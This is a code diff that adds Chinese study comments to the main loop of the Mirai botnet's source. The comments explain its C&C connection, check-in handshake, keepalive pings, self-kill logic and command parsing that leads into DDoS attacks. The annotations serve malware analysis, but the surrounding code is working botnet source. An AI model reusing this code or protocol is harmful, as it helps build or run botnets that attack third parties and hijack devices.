@@ -34,6 +34,8 @@ static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;    //远程控制C&C服务器的socket信息
+// fd_ctrl是本地ip和48101端口开放的TCP socket，绑定且监听，等待远程server的连接
+// fd_serv是本地创建的连接远程server的一个本地fd。
 int fd_ctrl = -1, fd_serv = -1;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
@@ -126,7 +128,7 @@ int main(int argc, char **args) // ./dvrHelper id
 
     rand_init();    //随机数种子初始化【ppid、pid、clock、time】
 
-    util_zero(id_buf, 32);  //id_buf来自于args[1]
+    util_zero(id_buf, 32);  //id_buf来自于args[1],猜测应该是一个本地可绑定ip
     if (argc == 2 && util_strlen(args[1]) < 32)
     {
         util_strcpy(id_buf, args[1]);
@@ -191,15 +193,17 @@ int main(int argc, char **args) // ./dvrHelper id
         // Socket for accept()
         if (fd_ctrl != -1)
             FD_SET(fd_ctrl, &fdsetrd);      //FD_SET:将fd加入set集合
+        //fd_ctrl等待可读
 
         // Set up CNC sockets
         if (fd_serv == -1)
-            establish_connection(); //设置fd_serv为与C&C交互的本地socket
-
-        if (pending_connection)
-            FD_SET(fd_serv, &fdsetwr);
+            establish_connection(); //设置fd_serv为与C&C交互的本地socket【触发resolve_func，也就是anti_gdb_entry中赋值的函数】
+        
+        //上述函数设置了pending_connection为TRUE
+        if (pending_connection) 
+            FD_SET(fd_serv, &fdsetwr);  //将本地fd_serv放入fdsetwr，等待写入。[第一次]
         else
-            FD_SET(fd_serv, &fdsetrd);
+            FD_SET(fd_serv, &fdsetrd); //将本地fd_serv放入fdsetrd，等待读取。[此后都是]
 
         // Get maximum FD for select
         if (fd_ctrl > fd_serv)
@@ -211,7 +215,9 @@ int main(int argc, char **args) // ./dvrHelper id
         timeo.tv_usec = 0;
         timeo.tv_sec = 10;
         //select轮询，10s一次，设置监听的fd集合和最大的fd值
-        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
+        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);   //返回需要检查的文件描述字个数
+        //如果timeout->tv_sec !=0 ||timeout->tv_usec!= 0，设置select的阻塞等待时间。
+        //在超时时间即将用完但又没有描述符合条件的话，返回 0。
         if (nfds == -1)
         {
 #ifdef DEBUG
@@ -219,40 +225,43 @@ int main(int argc, char **args) // ./dvrHelper id
 #endif
             continue;
         }
-        else if (nfds == 0) 
+        else if (nfds == 0) //没有fd被触发，mirai也没有接收到命令任何。
         {
             uint16_t len = 0;
 
-            if (pings++ % 6 == 0)
+            if (pings++ % 6 == 0)   //6次超时一个循环，mirai发送len=0到server，确定还活着？
                 send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
         }
 
+        // 由于select函数成功返回时会将未准备好的描述符位清零。
+        //通常我们使用FD_ISSET是为了检查在select函数返回后，某个描述符是否准备好，以便进行接下来的处理操作。
+        //也就是说现在有个cli想要接入mirai【这样mirai就会自销毁】
         // Check if we need to kill ourselves
-        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
+        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))   //fd_ctrl不为空，且被激活。
         {
             struct sockaddr_in cli_addr;
             socklen_t cli_addr_len = sizeof (cli_addr);
 
-            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
+            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);   //mirai，接收cli端的接入请求。【阻塞直到有连接请求）
 
 #ifdef DEBUG
             printf("[main] Detected newer instance running! Killing self\n");
 #endif
 #ifdef MIRAI_TELNET
-            scanner_kill();
+            scanner_kill();     //kill 扫描scanner子进程。
 #endif
-            killer_kill();
+            killer_kill();  //销毁自身fork出来的killer子进程
             attack_kill_all();
             kill(pgid * -1, 9);
-            exit(0);
+            exit(0);    //销毁自身
         }
 
         // Check if CNC connection was established or timed out or errored
-        if (pending_connection)
+        if (pending_connection)     //1.除了第一次，其他情况都是FALSE
         {
-            pending_connection = FALSE;
+            pending_connection = FALSE; //第一次循环就由TRUE变为FALSE
 
-            if (!FD_ISSET(fd_serv, &fdsetwr))
+            if (!FD_ISSET(fd_serv, &fdsetwr))  
             {
 #ifdef DEBUG
                 printf("[main] Timed out while connecting to CNC\n");
@@ -274,11 +283,12 @@ int main(int argc, char **args) // ./dvrHelper id
                     fd_serv = -1;
                     sleep((rand_next() % 10) + 1);
                 }
-                else
+                else     //fd_serv第一次可能会等待写入
                 {
                     uint8_t id_len = util_strlen(id_buf);
 
                     LOCAL_ADDR = util_local_addr();
+                    //第一次，mirai端完全准备好之后，主动联系server端，发送"\x00\x00\x00\x01"、argv[1]的长度和argv[1]本身(存储在id_buf中，感觉是一个本地ip)【Bot正式上线】
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
@@ -290,8 +300,8 @@ int main(int argc, char **args) // ./dvrHelper id
 #endif
                 }
             }
-        }
-        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
+        }  //2、之后只会执行else分支了。第二次循环的时候fd_serv已经被加入fdsetrd集合中，等待c&c发送攻击指令
+        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))  //C&C服务器的连接位置已经明确。并且本地对应fd已经connect好，加入到fdsetrd中
         {
             int n;
             uint16_t len;
@@ -299,7 +309,13 @@ int main(int argc, char **args) // ./dvrHelper id
 
             // Try to read in buffer length from CNC
             errno = 0;
-            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
+            //可以发现mirai与服务器之间的自定义通讯协议是：先接收一个len
+            //如果成功接收，且这个len为0，那么这也就是一个ping包，确定mirai端还活着
+            //如果成功接收，但是len>1024，那么就直接close这个本地socket表示和C&C交互结束
+            //如果len正常，那么接下来下一步就是接收len长度的buf数据，存储到rdbuf
+            //但是这里不是马上用这个数据，一开始的rdbuf只要有数据就可以
+            //之后还要再接收len，和len长度的buf数据，这时候才是真的C&C指令。
+            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK); //从C&C中接收信息，
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
@@ -314,7 +330,7 @@ int main(int argc, char **args) // ./dvrHelper id
 #ifdef DEBUG
                 printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
 #endif
-                teardown_connection();
+                teardown_connection();  //关闭本地连接C&C的socket fd
                 continue;
             }
 
@@ -362,7 +378,7 @@ int main(int argc, char **args) // ./dvrHelper id
 #endif
 
             if (len > 0)
-                attack_parse(rdbuf, len);
+                attack_parse(rdbuf, len);  //解析命令，对指定目标发动特定的DDoS攻击！
         }
     }
 
